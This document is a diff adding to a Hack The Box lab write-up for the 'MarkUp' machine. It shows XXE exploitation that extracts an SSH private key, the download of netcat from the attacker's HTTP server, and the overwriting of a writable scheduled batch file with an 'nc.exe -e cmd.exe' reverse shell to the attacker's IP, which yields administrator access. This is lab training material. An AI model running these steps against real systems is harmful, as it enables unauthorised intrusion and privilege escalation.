@@ -52,18 +52,113 @@
 
 ![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/3.png)
 
-// lets check if the site is vulnerable to XXE. (Read about [xxe](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) here)
+// Lets check if the site is vulnerable to XXE[XML External Entity]. (Read about [xxe](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) here)
 
 ![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/4.png)
 
+// Its seems the site is indeed vulnerable to xxe !. We can try extract ssh private key since 22/tcp ssh service open.
+
+![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/5.png)
+
+// Its worked !, Now we will save the private key as ssh_daniel_private.key and connect to the server.
+
+    $ ssh -i ssh_daniel_private.key daniel@10.10.10.49
+
+// I had some problems when get some ERROR that requested Daniel's password, to solve that we need
+to change the private key permissions.
+
+    $ chmod 600 ssh_daniel_private.key
+    $ ssh -i ssh_daniel_private.key daniel@10.10.10.49
+
+
+// And we have Connection !
+
+    daniel@MARKUP C:\Users\daniel\Desktop>whoami
+    markup\daniel
+
+    daniel@MARKUP C:\Users\daniel\Desktop>type user.txt
+    032d2fc......................
+
+### ----Privilleges Escalation----
+
+// After some digging in noticed to a file named job.bat in :\Log-Management
+
+    daniel@MARKUP C:\Log-Management>dir
+     Volume in drive C has no label.
+     Volume Serial Number is 4C8E-E2DC
+
+     Directory of C:\Log-Management
+
+    03/12/2020  03:56 AM    <DIR>          .
+    03/12/2020  03:56 AM    <DIR>          ..
+    03/06/2020  02:42 AM               346 job.bat
+                   1 File(s)            346 bytes
+                   2 Dir(s)  13,828,132,864 bytes free
 
 
 
+// We can see that all he do its to clear logs
+
+    daniel@MARKUP C:\Log-Management>type job.bat
+    @echo off 
+    FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+    IF (%adminTest%)==(Access) goto noAdmin
+    for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+    echo.
+    echo Event Logs have been cleared!
+    goto theEnd
+    :do_clear
+    wevtutil.exe cl %1
+    goto :eof
+    :noAdmin
+    echo You must run this script as an Administrator!
+    :theEnd
+    exit
 
 
-Access ID | Name | Email
-----------|------|-------
-34322 | admin | admin@megacorp.com
 
-// When navigating to uploads (http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads) we get error due privilleges
+// we also can see that group BUILTIN\Users has full control [F] over the file
+// those users represent all local users which includes daniel
+
+    daniel@MARKUP C:\Log-Management>icacls job.bat
+    job.bat BUILTIN\Users:(F)
+            NT AUTHORITY\SYSTEM:(I)(F)
+            BUILTIN\Administrators:(I)(F)
+            BUILTIN\Users:(I)(RX)
+
+    Successfully processed 1 files; Failed processing 0 files
+
+
+
+// Deliver netcat to target with python http server
+
+    $ python3 -m http.server 9002
+
+
+    daniel@MARKUP C:\Log-Management>curl http://10.10.16.11:9002/nc.exe -o c:\users\daniel\nc.exe   
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100 59392  100 59392    0     0  59392      0  0:00:01  0:00:01 --:--:-- 44190
+
+
+// Edit job.bat
+
+    daniel@MARKUP C:\Log-Management>echo C:\Users\daniel\nc.exe -e cmd.exe 10.10.16.11 1444 > C:\Log
+    -Management\job.bat
+
+
+     $ nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.11] from (UNKNOWN) [10.10.10.49] 49758
+    Microsoft Windows [Version 10.0.17763.107]
+    (c) 2018 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>whoami
+    whoami
+    markup\administrator
+
+    C:\Users\Administrator\Desktop>type root.txt
+    type root.txt
+    f574a3e.....................
+
 
